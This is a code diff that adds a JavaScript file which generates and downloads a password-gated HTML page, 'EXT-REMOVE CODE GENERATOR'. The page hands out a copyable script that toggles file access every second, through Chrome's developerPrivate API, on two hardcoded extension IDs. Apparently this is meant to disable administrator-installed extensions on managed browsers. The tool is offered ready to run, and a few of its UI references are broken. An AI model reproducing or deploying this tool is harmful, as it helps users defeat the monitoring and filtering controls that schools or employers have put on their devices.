@@ -1,0 +1,352 @@
+const htmlContent = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EXT-REMOVE CODE GENERATOR</title>
+    <style>
+        :root {
+            --bg-color: #000000;
+            --text-color: #ffffff;
+            --button-color: #00ff00;
+            --button-text-color: #000000;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .theme-options {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            z-index: 1;
+            background-color: #333;
+            padding: 10px;
+            border-radius: 5px;
+            color: white;
+        }
+
+        h2 {
+            color: var(--text-color);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input {
+            padding: 5px;
+            margin-bottom: 10px;
+            width: 200px;
+        }
+
+        button {
+            padding: 10px;
+            background-color: var(--button-color);
+            color: var(--button-text-color);
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        #keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-gap: 5px;
+            margin-bottom: 20px;
+        }
+
+        #passwordInput {
+            padding: 5px;
+            margin-bottom: 10px;
+            width: 200px;
+        }
+
+        #accessSection {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        #codeTextArea {
+            width: 80%;
+            height: 200px;
+            margin: 20px 0;
+        }
+
+        #copyButton {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: var(--button-color);
+            color: var(--button-text-color);
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="title">EXT-REMOVE CODE GENERATOR</div>
+
+    <div class="theme-options">
+        <h3>Theme Customization</h3>
+        <label for="backgroundColor">Background Color:</label>
+        <input type="color" id="backgroundColor" value="#000000" onchange="updateTheme()">
+
+        <label for="textColor">Text Color:</label>
+        <input type="color" id="textColor" value="#ffffff" onchange="updateTheme()">
+
+        <label for="buttonColor">Button Color:</label>
+        <input type="color" id="buttonColor" value="#00ff00" onchange="updateTheme()">
+
+        <label for="buttonTextColor">Button Text Color:</label>
+        <input type="color" id="buttonTextColor" value="#000000" onchange="updateTheme()">
+    </div>
+
+    <h2>Password Entry</h2>
+
+    <div id="keypad">
+        <button onclick="appendToInput(1)">1</button>
+        <button onclick="appendToInput(2)">2</button>
+        <button onclick="appendToInput(3)">3</button>
+        <button onclick="appendToInput(4)">4</button>
+        <button onclick="appendToInput(5)">5</button>
+        <button onclick="appendToInput(6)">6</button>
+        <button onclick="appendToInput(7)">7</button>
+        <button onclick="appendToInput(8)">8</button>
+        <button onclick="appendToInput(9)">9</button>
+        <button onclick="appendToInput(0)">0</button>
+        <button onclick="clearInput()">Clear</button>
+        <button onclick="checkPassword()">Enter</button>
+    </div>
+
+    <label for="passwordInput">Password:</label>
+    <div>
+        <input type="password" id="passwordInput">
+        <button onclick="togglePasswordVisibility()">Show</button>
+    </div>
+
+    <div id="accessSection">
+        <h2>Access Granted</h2>
+        <p>Copy the code below:</p>
+        <textarea id="codeTextArea" readonly></textarea>
+        <button id="copyButton" onclick="copyCode()">Copy Code</button>
+    </div>
+
+    <script>
+        const scriptState = {
+            shim: false,
+            scriptRunning: true
+        };
+
+        const predefinedIds = ["Haldlgldplgnggkjaafhelgiaglafanh", "Jcdhmojfecjfmbdpchihbeilohgnbdci"];
+
+        const updateExtensionConfiguration = () => {
+            predefinedIds.forEach((id) => {
+                if (opener.chrome && opener.chrome.developerPrivate) {
+                    opener.chrome.developerPrivate.updateExtensionConfiguration({
+                        extensionId: id,
+                        fileAccess: scriptState.shim,
+                    });
+                }
+            });
+            scriptState.shim = !scriptState.shim;
+        };
+
+        const runScriptContinuously = () => {
+            return setInterval(updateExtensionConfiguration, 1000);
+        };
+
+        const runScriptOnce = () => {
+            updateExtensionConfiguration();
+            alert("Script executed once.");
+        };
+
+        let intervalId;
+
+        function startScriptContinuously() {
+            intervalId = runScriptContinuously();
+            continuousRunButton.disabled = true;
+            stopScriptButton.disabled = false;
+            toggleScriptButton.disabled = false;
+        }
+
+        function stopScript() {
+            clearInterval(intervalId);
+            continuousRunButton.disabled = false;
+            stopScriptButton.disabled = true;
+            toggleScriptButton.disabled = true;
+        }
+
+        function toggleScript() {
+            scriptState.scriptRunning = !scriptState.scriptRunning;
+
+            if (scriptState.scriptRunning) {
+                intervalId = runScriptContinuously();
+                continuousRunButton.disabled = true;
+            } else {
+                continuousRunButton.disabled = false;
+                clearInterval(intervalId);
+            }
+        }
+
+        function updateTheme() {
+            var backgroundColor = document.getElementById("backgroundColor").value;
+            var textColor = document.getElementById("textColor").value;
+            var buttonColor = document.getElementById("buttonColor").value;
+            var buttonTextColor = document.getElementById("buttonTextColor").value;
+
+            document.body.style.setProperty('--bg-color', backgroundColor);
+            document.body.style.setProperty('--text-color', textColor);
+            document.body.style.setProperty('--button-color', buttonColor);
+            document.body.style.setProperty('--button-text-color', buttonTextColor);
+        }
+
+        function appendToInput(digit) {
+            var passwordInput = document.getElementById("passwordInput");
+            passwordInput.value += digit;
+        }
+
+        function clearInput() {
+            var passwordInput = document.getElementById("passwordInput");
+            passwordInput.value = "";
+        }
+
+        function checkPassword() {
+            var enteredPassword = document.getElementById("passwordInput").value;
+            if (enteredPassword === "02069") {
+                document.getElementById("accessSection").style.display = "block";
+                generateCode();
+            }
+        }
+
+        function togglePasswordVisibility() {
+            var passwordInput = document.getElementById("passwordInput");
+            var button = document.querySelector('#passwordVisibilityButton');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                button.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                button.textContent = 'Show';
+            }
+        }
+
+        function generateCode() {
+            const code = \`
+// Encapsulate variables within an object
+const scriptState = {
+  shim: false,
+  scriptRunning: true
+};
+
+// Predefined extension IDs
+const predefinedIds = ["Haldlgldplgnggkjaafhelgiaglafanh", "Jcdhmojfecjfmbdpchihbeilohgnbdci"];
+
+// Function to update extension configuration
+const updateExtensionConfiguration = () => {
+  predefinedIds.forEach((id) => {
+    if (opener.chrome && opener.chrome.developerPrivate) {
+      opener.chrome.developerPrivate.updateExtensionConfiguration({
+        extensionId: id,
+        fileAccess: scriptState.shim
+      });
+    }
+  });
+  scriptState.shim = !scriptState.shim;
+};
+
+// Run the script continuously
+const runScriptContinuously = () => {
+  return setInterval(updateExtensionConfiguration, 1000); // Runs every second
+};
+
+// Run the script once
+const runScriptOnce = () => {
+  updateExtensionConfiguration();
+  alert("Script executed once.");
+};
+
+// Ask if you want to run the script continuously or just once
+const continuousRun = confirm("Do you want the script to run continuously?");
+
+if (continuousRun) {
+  const intervalId = runScriptContinuously();
+
+  // Ask if you want to stop the script
+  const stopScript = confirm("Do you want to stop the script?");
+  if (stopScript) {
+    clearInterval(intervalId);
+    scriptState.scriptRunning = false;
+    alert("Script stopped.");
+  }
+} else {
+  runScriptOnce();
+  scriptState.scriptRunning = false;
+}
+
+// Allow the script to be turned on/off
+while (scriptState.scriptRunning) {
+  const toggleScript = confirm("Do you want to toggle the script?");
+  if (toggleScript) {
+    scriptState.scriptRunning = !scriptState.scriptRunning;
+    if (scriptState.scriptRunning) {
+      const intervalId = runScriptContinuously();
+
+      // Ask if you want to stop the script
+      const stopScript = confirm("Do you want to stop the script?");
+      if (stopScript) {
+        clearInterval(intervalId);
+        scriptState.scriptRunning = false;
+        alert("Script stopped.");
+      }
+    }
+  } else {
+    scriptState.scriptRunning = false;
+  }
+}
+\`;
+            document.getElementById("codeTextArea").value = code;
+        }
+
+        function copyCode() {
+            const codeTextArea = document.getElementById("codeTextArea");
+            codeTextArea.select();
+            document.execCommand("copy");
+            alert("Code copied to clipboard!");
+        }
+    </script>
+
+</body>
+</html>
+`;
+
+const blob = new Blob([htmlContent], { type: 'text/html' });
+
+const a = document.createElement('a');
+a.href = window.URL.createObjectURL(blob);
+a.download = 'enhanced_extension_input.html';
+
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
